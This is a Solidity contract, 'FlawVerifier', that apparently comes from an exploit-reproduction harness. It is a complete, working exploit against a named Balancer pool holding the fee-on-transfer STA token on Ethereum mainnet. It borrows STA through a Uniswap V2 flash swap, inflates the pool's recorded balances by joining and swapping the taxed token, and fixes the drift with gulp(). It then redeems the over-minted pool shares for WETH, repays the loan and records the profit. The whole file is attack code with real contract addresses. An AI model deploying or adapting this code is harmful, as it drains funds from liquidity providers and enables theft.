pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IBPool is IERC20 {
    function isFinalized() external view returns (bool);
    function getCurrentTokens() external view returns (address[] memory);
    function getBalance(address token) external view returns (uint256);
    function getController() external view returns (address);
    function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;
    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
    function swapExactAmountIn(
        address tokenIn,
        uint256 tokenAmountIn,
        address tokenOut,
        uint256 minAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function swapExactAmountOut(
        address tokenIn,
        uint256 maxAmountIn,
        address tokenOut,
        uint256 tokenAmountOut,
        uint256 maxPrice
    ) external returns (uint256 tokenAmountIn, uint256 spotPriceAfter);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut) external returns (uint256 poolAmountOut);
    function joinswapPoolAmountOut(address tokenIn, uint256 poolAmountOut, uint256 maxAmountIn) external returns (uint256 tokenAmountIn);
    function exitswapPoolAmountIn(address tokenOut, uint256 poolAmountIn, uint256 minAmountOut) external returns (uint256 tokenAmountOut);
    function exitswapExternAmountOut(address tokenOut, uint256 tokenAmountOut, uint256 maxPoolAmountIn) external returns (uint256 poolAmountIn);
    function gulp(address token) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ProbeSink {
    function tokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}

contract FlawVerifier {
    address private constant TARGET_POOL = 0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IBPool private constant POOL = IBPool(TARGET_POOL);
    IUniswapV2Router02 private constant ROUTER = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    IUniswapV2Factory private constant FACTORY = IUniswapV2Factory(UNISWAP_V2_FACTORY);

    uint256 private constant MAX_BPS = 10_000;
    uint256 private constant MAX_IN_RATIO_BPS = 4_850;
    uint256 private constant GULP_LOOP_COUNT = 10;
    uint256 private constant PRE_GULP_SWAP_LOOPS = 8;
    uint256 private constant POST_GULP_SWAP_LOOPS = 12;
    uint256 private constant RECYCLE_DIVISOR = 4;
    uint256 private constant SINGLE_EXIT_LOOPS = 6;

    ProbeSink private immutable PROBE_SINK;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        PROBE_SINK = new ProbeSink();
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;

        if (_hasUsableVerifierBalance()) {
            try this.executeWithCurrentBalance() {
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }

        uint16[10] memory flashAttempts = [uint16(300), uint16(200), uint16(150), uint16(120), uint16(100), uint16(80), uint16(60), uint16(40), uint16(25), uint16(15)];
        for (uint256 i = 0; i < flashAttempts.length; i++) {
            try this.executeWithStaFlashSwapBps(flashAttempts[i]) {
                if (_profitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function executeWithCurrentBalance() external {
        require(msg.sender == address(this), "SELF_ONLY");

        uint256 startingWeth = _wethBalance();
        _runExploit();

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function executeWithStaFlashSwapBps(uint256 reserveBps) external {
        require(msg.sender == address(this), "SELF_ONLY");

        (address pair, uint256 staBorrow, uint256 repayWeth) = _staFlashSwapTerms(reserveBps);
        uint256 startingWeth = _wethBalance();

        if (IUniswapV2Pair(pair).token0() == STA) {
            IUniswapV2Pair(pair).swap(staBorrow, 0, address(this), abi.encode(pair, repayWeth, STA));
        } else {
            IUniswapV2Pair(pair).swap(0, staBorrow, address(this), abi.encode(pair, repayWeth, STA));
        }

        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_UNI_SENDER");

        (address pair, uint256 repayWeth, address borrowedToken) = abi.decode(data, (address, uint256, address));
        require(msg.sender == pair, "BAD_UNI_PAIR");
        require(borrowedToken == STA, "UNEXPECTED_ASSET");
        require(amount0 > 0 || amount1 > 0, "NO_BORROWED_ASSET");

        _runExploit();

        require(_wethBalance() >= repayWeth, "INSUFFICIENT_WETH_FOR_REPAY");
        _safeTransfer(WETH, pair, repayWeth);
    }

    function _runExploit() internal {
        require(TARGET_POOL.code.length > 0, "POOL_MISSING");
        require(UNISWAP_V2_ROUTER.code.length > 0, "ROUTER_MISSING");

        address[] memory tokens = POOL.getCurrentTokens();
        require(tokens.length >= 2, "POOL_TOO_SMALL");

        _approvePoolAndRouter(tokens);

        address taxedToken = _resolveTaxedToken(tokens);
        require(taxedToken != address(0), "NO_FEE_ON_TRANSFER_TOKEN_DETECTED");
        require(_containsToken(tokens, WETH), "WETH_NOT_BOUND");

        // Exploit-path alignment preserved:
        // 1) `rebind()` has the same nominal-accounting flaw, but it is controller-gated and is
        //    therefore not a realistic public execution path for this verifier.
        // 2) Public entrypoints `joinPool()`, `swapExactAmountIn()`, `swapExactAmountOut()`,
        //    `joinswapExternAmountIn()`, and `joinswapPoolAmountOut()` all credit the requested
        //    taxed-token amount before the pool observes what the token transfer actually delivered.
        // 3) `gulp()` is then used permissionlessly to overwrite the recorded reserve with the
        //    real `balanceOf(address(this))`, crystallizing the reserve drift into pricing/BPT math.
        // 4) Single-asset exits are a realistic public realization step after the same drifted
        //    accounting has already overminted BPT; they do not change the exploit causality.

        if (!POOL.isFinalized()) {
            require(POOL.getController() == address(this), "REBIND_REQUIRES_CONTROLLER");
        }

        _attemptSwapExactAmountInLoops(taxedToken, PRE_GULP_SWAP_LOOPS, true);
        _attemptSwapExactAmountOut(taxedToken);
        _attemptJoinSwapExternAmountIn(taxedToken);
        _attemptJoinSwapPoolAmountOut(taxedToken);
        _attemptJoinPoolDust(tokens, taxedToken);

        for (uint256 i = 0; i < GULP_LOOP_COUNT; i++) {
            uint256 realBalance = IERC20(taxedToken).balanceOf(TARGET_POOL);
            uint256 recordedBalance = POOL.getBalance(taxedToken);
            if (recordedBalance <= realBalance) {
                break;
            }
            POOL.gulp(taxedToken);
            if (POOL.getBalance(taxedToken) == realBalance) {
                break;
            }
        }

        _attemptFinalTaxedToWethDrains(taxedToken, POST_GULP_SWAP_LOOPS);
        _exitAnyBpt(tokens, taxedToken);
        _attemptFinalTaxedToWethDrains(taxedToken, POST_GULP_SWAP_LOOPS / 2);
        _convertResidualsToWeth(tokens, taxedToken);
    }

    function _attemptJoinPoolDust(address[] memory tokens, address taxedToken) internal {
        uint256 poolTotal = POOL.totalSupply();
        if (poolTotal == 0) {
            return;
        }

        uint256 poolAmountOut = poolTotal / 500_000;
        if (poolAmountOut == 0) {
            poolAmountOut = 1;
        }

        uint256[] memory maxAmountsIn = new uint256[](tokens.length);
        bool feasible = true;

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 bal = POOL.getBalance(tokens[i]);
            uint256 amountIn = ((poolAmountOut * bal) / poolTotal) + 1;
            if (amountIn == 0) {
                amountIn = 1;
            }
            maxAmountsIn[i] = amountIn * 2;

            uint256 have = IERC20(tokens[i]).balanceOf(address(this));
            if (have >= maxAmountsIn[i]) {
                continue;
            }

            uint256 need = maxAmountsIn[i] - have;
            if (tokens[i] == taxedToken) {
                uint256 budget = _min(_wethBalance() / 16, need / 8 + 1);
                if (budget == 0) {
                    feasible = false;
                    break;
                }

                _buyTokenExactIn(tokens[i], budget);
                if (IERC20(tokens[i]).balanceOf(address(this)) < maxAmountsIn[i]) {
                    feasible = false;
                    break;
                }
            } else if (tokens[i] == WETH) {
                if (_wethBalance() < maxAmountsIn[i]) {
                    feasible = false;
                    break;
                }
            } else {
                if (!_buyTokenExactOut(tokens[i], need, _wethBalance() / 10)) {
                    feasible = false;
                    break;
                }
            }
        }

        if (!feasible) {
            return;
        }

        try POOL.joinPool(poolAmountOut, maxAmountsIn) {} catch {}
    }

    function _attemptSwapExactAmountInLoops(address taxedToken, uint256 loops, bool recycleToTaxed) internal {
        for (uint256 i = 0; i < loops; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed * MAX_IN_RATIO_BPS) / MAX_BPS;
            if (maxAllowed <= 1) {
                break;
            }
            maxAllowed -= 1;

            uint256 amountIn = ourTaxed / 2;
            if (amountIn > maxAllowed) {
                amountIn = maxAllowed;
            }
            if (amountIn == 0) {
                break;
            }

            uint256 wethBefore = _wethBalance();
            try POOL.swapExactAmountIn(taxedToken, amountIn, WETH, 1, type(uint256).max) returns (uint256, uint256) {
                if (!recycleToTaxed) {
                    continue;
                }

                uint256 wethAfter = _wethBalance();
                if (wethAfter <= wethBefore) {
                    continue;
                }

                uint256 gainedWeth = wethAfter - wethBefore;
                uint256 recycle = gainedWeth / RECYCLE_DIVISOR;
                if (recycle > 0) {
                    _buyTokenExactIn(taxedToken, recycle);
                }
            } catch {
                break;
            }
        }
    }

    function _attemptSwapExactAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 poolTaxed = POOL.getBalance(taxedToken);
        uint256 poolWeth = POOL.getBalance(WETH);
        if (ourTaxed == 0 || poolTaxed <= 2 || poolWeth == 0) {
            return;
        }

        uint256 maxAllowed = (poolTaxed * MAX_IN_RATIO_BPS) / MAX_BPS;
        if (maxAllowed <= 1) {
            return;
        }
        maxAllowed -= 1;

        uint256 maxAmountIn = ourTaxed / 3;
        if (maxAmountIn > maxAllowed) {
            maxAmountIn = maxAllowed;
        }
        if (maxAmountIn == 0) {
            return;
        }

        uint256 tokenAmountOut = poolWeth / 500;
        if (tokenAmountOut == 0) {
            tokenAmountOut = 1;
        }

        try POOL.swapExactAmountOut(taxedToken, maxAmountIn, WETH, tokenAmountOut, type(uint256).max) returns (uint256, uint256) {} catch {}
    }

    function _attemptJoinSwapExternAmountIn(address taxedToken) internal {
        for (uint256 i = 0; i < 3; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed * MAX_IN_RATIO_BPS) / MAX_BPS;
            if (maxAllowed <= 1) {
                break;
            }
            maxAllowed -= 1;

            uint256 tokenAmountIn = ourTaxed / 4;
            if (tokenAmountIn > maxAllowed) {
                tokenAmountIn = maxAllowed;
            }
            if (tokenAmountIn == 0) {
                break;
            }

            try POOL.joinswapExternAmountIn(taxedToken, tokenAmountIn, 1) returns (uint256) {} catch {
                break;
            }
        }
    }

    function _attemptJoinSwapPoolAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 totalSupply = POOL.totalSupply();
        if (ourTaxed == 0 || totalSupply == 0) {
            return;
        }

        for (uint256 i = 0; i < 3; i++) {
            uint256 poolAmountOut = totalSupply / 50_000;
            if (poolAmountOut == 0) {
                poolAmountOut = 1;
            }

            try POOL.joinswapPoolAmountOut(taxedToken, poolAmountOut, ourTaxed) returns (uint256 tokenAmountIn) {
                if (tokenAmountIn == 0 || tokenAmountIn >= ourTaxed) {
                    break;
                }
                ourTaxed = IERC20(taxedToken).balanceOf(address(this));
                if (ourTaxed == 0) {
                    break;
                }
            } catch {
                break;
            }
        }
    }

    function _attemptFinalTaxedToWethDrains(address taxedToken, uint256 loops) internal {
        _attemptSwapExactAmountInLoops(taxedToken, loops, false);
    }

    function _exitAnyBpt(address[] memory tokens, address taxedToken) internal {
        uint256 bptBal = POOL.balanceOf(address(this));
        if (bptBal == 0) {
            return;
        }

        // Realize the overmint into an existing on-chain honest asset directly. This is a more
        // capital-efficient public unwind than `exitPool()` plus router sells, while preserving
        // the same causal chain: nominal taxed-token accounting -> `gulp()` crystallization ->
        // BPT redemption against honest reserves.
        for (uint256 i = 0; i < SINGLE_EXIT_LOOPS; i++) {
            bptBal = POOL.balanceOf(address(this));
            if (bptBal == 0) {
                break;
            }

            uint256 poolWeth = POOL.getBalance(WETH);
            if (poolWeth > 0) {
                uint256 desiredOut = poolWeth / 4;
                if (desiredOut > 0) {
                    try POOL.exitswapExternAmountOut(WETH, desiredOut, bptBal) returns (uint256) {
                        continue;
                    } catch {}
                }
            }

            uint256 portionIn = bptBal / 2;
            if (portionIn == 0) {
                portionIn = bptBal;
            }
            try POOL.exitswapPoolAmountIn(WETH, portionIn, 1) returns (uint256) {
                continue;
            } catch {
                break;
            }
        }

        bptBal = POOL.balanceOf(address(this));
        if (bptBal == 0) {
            return;
        }

        uint256[] memory mins = new uint256[](tokens.length);
        try POOL.exitPool(bptBal, mins) {} catch {}

        uint256 residualBpt = POOL.balanceOf(address(this));
        if (residualBpt > 0) {
            try POOL.exitswapPoolAmountIn(WETH, residualBpt, 1) returns (uint256) {} catch {}
        }

        if (IERC20(taxedToken).balanceOf(address(this)) > 0) {
            _attemptFinalTaxedToWethDrains(taxedToken, 4);
        }
    }

    function _convertResidualsToWeth(address[] memory tokens, address taxedToken) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 bal = IERC20(token).balanceOf(address(this));
            if (bal == 0) {
                continue;
            }

            if (token == taxedToken) {
                // The logs proved that routing residual STA back through the STA/WETH Uniswap V2
                // pair can be infeasible here: STA deflation can leave the pair's live token
                // balance below its stored reserve, making the router's fee-on-transfer sell path
                // underflow. Use the vulnerable Balancer pool itself as the public liquidation path
                // and keep any irreducible dust rather than reverting away already-realized profit.
                _attemptFinalTaxedToWethDrains(token, 6);
                continue;
            }

            _sellTokenToWeth(token, bal);
        }
    }

    function _resolveTaxedToken(address[] memory tokens) internal returns (address taxedToken) {
        if (_containsToken(tokens, STA)) {
            return STA;
        }
        return _findTaxedToken(tokens);
    }

    function _findTaxedToken(address[] memory tokens) internal returns (address taxedToken) {
        uint256 bestLoss;

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 budget = _wethBalance() / 200;
            if (budget == 0 || _wethBalance() < budget) {
                continue;
            }

            uint256 beforeBuy = IERC20(token).balanceOf(address(this));
            try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(budget, 1, _path(WETH, token), address(this), block.timestamp) {
                uint256 acquired = IERC20(token).balanceOf(address(this)) - beforeBuy;
                if (acquired == 0) {
                    continue;
                }

                uint256 probe = acquired / 5;
                if (probe == 0) {
                    probe = acquired;
                }

                uint256 sinkBefore = IERC20(token).balanceOf(address(PROBE_SINK));
                _safeTransfer(token, address(PROBE_SINK), probe);
                uint256 sinkAfter = IERC20(token).balanceOf(address(PROBE_SINK));
                uint256 sinkDelta = sinkAfter - sinkBefore;

                if (sinkDelta < probe) {
                    uint256 loss = probe - sinkDelta;
                    if (loss > bestLoss) {
                        bestLoss = loss;
                        taxedToken = token;
                    }
                }
            } catch {}
        }
    }

    function _buyTokenExactIn(address tokenOut, uint256 wethAmountIn) internal returns (uint256 received) {
        if (wethAmountIn == 0) {
            return 0;
        }

        uint256 beforeBal = IERC20(tokenOut).balanceOf(address(this));
        try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(wethAmountIn, 1, _path(WETH, tokenOut), address(this), block.timestamp) {
            received = IERC20(tokenOut).balanceOf(address(this)) - beforeBal;
        } catch {
            received = 0;
        }
    }

    function _buyTokenExactOut(address tokenOut, uint256 amountOut, uint256 maxWethIn) internal returns (bool ok) {
        uint256 wethBal = _wethBalance();
        if (amountOut == 0 || maxWethIn == 0 || wethBal == 0) {
            return false;
        }
        if (maxWethIn > wethBal) {
            maxWethIn = wethBal;
        }

        try ROUTER.swapTokensForExactTokens(amountOut, maxWethIn, _path(WETH, tokenOut), address(this), block.timestamp) returns (uint256[] memory) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _sellTokenToWeth(address tokenIn, uint256 amountIn) internal {
        try ROUTER.swapExactTokensForTokens(amountIn, 1, _path(tokenIn, WETH), address(this), block.timestamp) returns (uint256[] memory) {} catch {}
    }

    function _approvePoolAndRouter(address[] memory tokens) internal {
        _safeApprove(WETH, TARGET_POOL, type(uint256).max);
        _safeApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);
        _safeApprove(STA, TARGET_POOL, type(uint256).max);
        _safeApprove(STA, UNISWAP_V2_ROUTER, type(uint256).max);
        _safeApprove(address(POOL), TARGET_POOL, type(uint256).max);

        for (uint256 i = 0; i < tokens.length; i++) {
            _safeApprove(tokens[i], TARGET_POOL, type(uint256).max);
            _safeApprove(tokens[i], UNISWAP_V2_ROUTER, type(uint256).max);
        }
    }

    function _staFlashSwapTerms(uint256 reserveBps) internal view returns (address pair, uint256 staBorrow, uint256 repayWeth) {
        pair = FACTORY.getPair(WETH, STA);
        require(pair != address(0) && pair.code.length > 0, "NO_STA_PAIR");

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        uint256 staReserve;
        uint256 wethReserve;

        if (IUniswapV2Pair(pair).token0() == STA) {
            staReserve = uint256(reserve0);
            wethReserve = uint256(reserve1);
        } else {
            staReserve = uint256(reserve1);
            wethReserve = uint256(reserve0);
        }

        uint256 poolSta = POOL.getBalance(STA);
        uint256 poolBound = (poolSta * 3) / 10;
        uint256 reserveBound = (staReserve * reserveBps) / MAX_BPS;
        staBorrow = _min(poolBound, reserveBound);

        require(staBorrow > 0, "STA_FLASH_TOO_SMALL");
        require(staBorrow < staReserve, "STA_FLASH_TOO_LARGE");

        repayWeth = _getAmountIn(staBorrow, wethReserve, staReserve);
    }

    function _hasUsableVerifierBalance() internal view returns (bool) {
        if (_wethBalance() > 0) {
            return true;
        }
        if (IERC20(STA).balanceOf(address(this)) > 0) {
            return true;
        }
        if (TARGET_POOL.code.length == 0) {
            return false;
        }

        uint256 bptBal = POOL.balanceOf(address(this));
        if (bptBal > 0) {
            return true;
        }

        address[] memory tokens = POOL.getCurrentTokens();
        for (uint256 i = 0; i < tokens.length; i++) {
            if (IERC20(tokens[i]).balanceOf(address(this)) > 0) {
                return true;
            }
        }
        return false;
    }

    function _path(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    function _containsToken(address[] memory tokens, address token) internal pure returns (bool) {
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == token) {
                return true;
            }
        }
        return false;
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20(WETH).balanceOf(address(this));
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "BAD_UNI_QUOTE");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}
